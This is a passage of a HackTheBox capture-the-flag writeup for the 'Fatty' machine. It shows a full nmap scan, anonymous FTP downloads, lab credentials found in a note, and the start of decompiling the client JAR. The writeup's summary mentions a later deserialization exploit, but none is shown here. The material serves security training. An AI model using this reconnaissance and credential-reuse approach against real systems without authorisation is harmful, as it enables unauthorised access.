<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Fatty | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,insane"><meta name=description content="Fatty HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/fatty/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/fatty/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Fatty "><meta property="og:description" content="Fatty HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/fatty/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-08-08T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png"><meta name=twitter:title content="Fatty "><meta name=twitter:description content="Fatty HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Fatty ","item":"https://s4ch.github.io/writeups/hackthebox/fatty/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Fatty ","name":"Fatty ","description":"Fatty HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","insane"],"articleBody":"Information Name: Fatty Profile: www.hackthebox.eu Difficulty: Insane OS: Linux Points: 50 Overview TL;DR: Java code review, bytecode JAR modification; exploit deserialization.\nInstall tools used in this WU on BlackArch Linux:\n1 pacman -S nmap filezilla jd-gui recaf Network enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 # Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.022s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar | -rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt | -rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt |_-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.15.33 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA) |_ 256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519) 1337/tcp open ssl/waste? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. 1338/tcp open ssl/wmc-log-svc? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. 1339/tcp open ssl/kjtsiteserver? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. ... Host script results: |_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds FTP With FileZilla we can retrieve the files available on the anonymously accessible FTP server.\n1 2 3 4 | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar | -rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt | -rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt |_-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt note.txt\n1 2 3 4 5 6 7 8 9 10 11 Dear members, because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of doing it yourself ;) Best regards, qtc So we will need to decompile the jar, change the port and recompile it.\nnote2.txt\n1 2 3 4 5 6 7 8 9 10 11 Dear members, we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from. Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually. Best regards, qtc We may need to use Java 8, I have one if needed:\n1 2 3 4 5 $ archlinux-java status Available Java environments: java-10-openjdk java-14-openjdk (default) java-8-openjdk note3.txt\n1 2 3 4 5 6 7 8 9 10 Dear members, We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account: User: qtc Pass: clarabibi Best regards, qtc We will be able to use those creds.\nJava decompiling Let’s open fatty-client.jar in jd-gui.\nIn the beans.xml config file, we can retrieve the server connection information, a keystore, and a secret.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u003c?xml version = \"1.0\" encoding = \"UTF-8\"?\u003e ","wordCount":"5951","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png","datePublished":"2020-08-08T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/fatty/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Fatty</h1><div class=post-description>Fatty HackTheBox writeup</div><div class=post-meta><span title='2020-08-08 00:00:00 +0000 UTC'>August 8, 2020</span>&nbsp;·&nbsp;28 min&nbsp;·&nbsp;5951 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/insane/ class=post-tag title=insane>insane</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png alt="Fatty HackTheBox Machine"><p>Fatty - Insane Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#ftp>FTP</a></li><li><a href=#java-decompiling>Java decompiling</a></li><li><a href=#client-discovery>Client discovery</a></li><li><a href=#code-analysis-fatty-client>Code analysis: fatty client</a></li><li><a href=#code-analysis-fatty-server>Code analysis: fatty server</a></li><li><a href=#java-object-deserialization-exploit>Java object deserialization exploit</a></li><li><a href=#system-reconnaissance>System reconnaissance</a></li><li><a href=#privilege-escalation-of-machine>Privilege Escalation of Machine</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Fatty</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/227>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Insane</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 50</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: Java code review, bytecode JAR modification; exploit deserialization.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pacman -S nmap filezilla jd-gui recaf
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.174
</span></span><span class=line><span class=cl>Host is up (0.022s latency).
</span></span><span class=line><span class=cl>Not shown: 65530 closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE            VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp                vsftpd 2.0.8 or later
</span></span><span class=line><span class=cl>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span></span><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
</span></span><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
</span></span><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
</span></span><span class=line><span class=cl>|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
</span></span><span class=line><span class=cl>| ftp-syst:
</span></span><span class=line><span class=cl>|   STAT:
</span></span><span class=line><span class=cl>| FTP server status:
</span></span><span class=line><span class=cl>|      Connected to 10.10.15.33
</span></span><span class=line><span class=cl>|      Logged in as ftp
</span></span><span class=line><span class=cl>|      TYPE: ASCII
</span></span><span class=line><span class=cl>|      No session bandwidth limit
</span></span><span class=line><span class=cl>|      Session timeout in seconds is 300
</span></span><span class=line><span class=cl>|      Control connection is plain text
</span></span><span class=line><span class=cl>|      Data connections will be plain text
</span></span><span class=line><span class=cl>|      At session startup, client count was 4
</span></span><span class=line><span class=cl>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl>|_End of status
</span></span><span class=line><span class=cl>22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
</span></span><span class=line><span class=cl>|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
</span></span><span class=line><span class=cl>1337/tcp open  ssl/waste?
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 4096
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2019-09-11T15:42:00
</span></span><span class=line><span class=cl>| Not valid after:  2020-09-10T15:42:00
</span></span><span class=line><span class=cl>| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
</span></span><span class=line><span class=cl>|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
</span></span><span class=line><span class=cl>|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
</span></span><span class=line><span class=cl>1338/tcp open  ssl/wmc-log-svc?
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 4096
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2019-09-11T15:42:00
</span></span><span class=line><span class=cl>| Not valid after:  2020-09-10T15:42:00
</span></span><span class=line><span class=cl>| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
</span></span><span class=line><span class=cl>|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
</span></span><span class=line><span class=cl>|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
</span></span><span class=line><span class=cl>1339/tcp open  ssl/kjtsiteserver?
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 4096
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2019-09-11T15:42:00
</span></span><span class=line><span class=cl>| Not valid after:  2020-09-10T15:42:00
</span></span><span class=line><span class=cl>| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
</span></span><span class=line><span class=cl>|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
</span></span><span class=line><span class=cl>|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h2><p>With <code>FileZilla</code> we can retrieve the files available on the anonymously
accessible FTP server.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
</span></span><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
</span></span><span class=line><span class=cl>| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
</span></span><span class=line><span class=cl>|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
</span></span></code></pre></td></tr></table></div></div><p><code>note.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Dear</span> <span class=n>members</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>because</span> <span class=n>of</span> <span class=n>some</span> <span class=n>security</span> <span class=n>issues</span> <span class=n>we</span> <span class=n>moved</span> <span class=n>the</span> <span class=n>port</span> <span class=n>of</span> <span class=n>our</span> <span class=n>fatty</span> <span class=n>java</span> <span class=n>server</span> <span class=n>from</span> <span class=mi>8000</span> <span class=n>to</span> <span class=n>the</span> <span class=n>hidden</span> <span class=ow>and</span> <span class=n>undocumented</span> <span class=n>port</span> <span class=mf>1337.</span>
</span></span><span class=line><span class=cl><span class=n>Furthermore</span><span class=p>,</span> <span class=n>we</span> <span class=n>created</span> <span class=n>two</span> <span class=n>new</span> <span class=n>instances</span> <span class=n>of</span> <span class=n>the</span> <span class=n>server</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>1338</span> <span class=ow>and</span> <span class=mf>1339.</span> <span class=n>They</span> <span class=n>offer</span> <span class=n>exactly</span> <span class=n>the</span> <span class=n>same</span> <span class=n>server</span> <span class=ow>and</span> <span class=n>it</span> <span class=n>would</span> <span class=n>be</span> <span class=n>nice</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>you</span> <span class=n>use</span> <span class=n>different</span> <span class=n>servers</span> <span class=n>from</span> <span class=n>day</span> <span class=n>to</span> <span class=n>day</span> <span class=n>to</span> <span class=n>balance</span> <span class=n>the</span> <span class=n>server</span> <span class=nb>load</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>We</span> <span class=n>were</span> <span class=n>too</span> <span class=n>lazy</span> <span class=n>to</span> <span class=n>fix</span> <span class=n>the</span> <span class=n>default</span> <span class=n>port</span> <span class=ow>in</span> <span class=n>the</span> <span class=s1>&#39;.jar&#39;</span> <span class=n>file</span><span class=p>,</span> <span class=n>but</span> <span class=n>since</span> <span class=n>you</span> <span class=n>are</span> <span class=n>all</span> <span class=n>senior</span> <span class=n>java</span> <span class=n>developers</span> <span class=n>you</span> <span class=n>should</span> <span class=n>be</span> <span class=n>capable</span> <span class=n>of</span>
</span></span><span class=line><span class=cl><span class=n>doing</span> <span class=n>it</span> <span class=n>yourself</span> <span class=p>;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Best</span> <span class=n>regards</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>qtc</span>
</span></span></code></pre></td></tr></table></div></div><p>So we will need to decompile the jar, change the port and recompile it.</p><p><code>note2.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Dear members,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>we are currently experimenting with new java layouts. The new client uses a static layout. If your
</span></span><span class=line><span class=cl>are using a tiling window manager or only have a limited screen size, try to resize the client window
</span></span><span class=line><span class=cl>until you see the login from.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
</span></span><span class=line><span class=cl>per default, you may need to install it manually.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Best regards,
</span></span><span class=line><span class=cl>qtc
</span></span></code></pre></td></tr></table></div></div><p>We may need to use Java 8, I have one if needed:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ archlinux-java status
</span></span><span class=line><span class=cl>Available Java environments:
</span></span><span class=line><span class=cl>  java-10-openjdk
</span></span><span class=line><span class=cl>  java-14-openjdk (default)
</span></span><span class=line><span class=cl>  java-8-openjdk
</span></span></code></pre></td></tr></table></div></div><p><code>note3.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Dear members,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We had to remove all other user accounts because of some seucrity issues.
</span></span><span class=line><span class=cl>Until we have fixed these issues, you can use my account:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User: qtc
</span></span><span class=line><span class=cl>Pass: clarabibi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Best regards,
</span></span><span class=line><span class=cl>qtc
</span></span></code></pre></td></tr></table></div></div><p>We will be able to use those creds.</p><h2 id=java-decompiling>Java decompiling<a hidden class=anchor aria-hidden=true href=#java-decompiling>#</a></h2><p>Let&rsquo;s open <code>fatty-client.jar</code> in <a href=https://java-decompiler.github.io/>jd-gui</a>.</p><p>In the <code>beans.xml</code> config file, we can retrieve the server connection
information, a keystore, and a secret.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
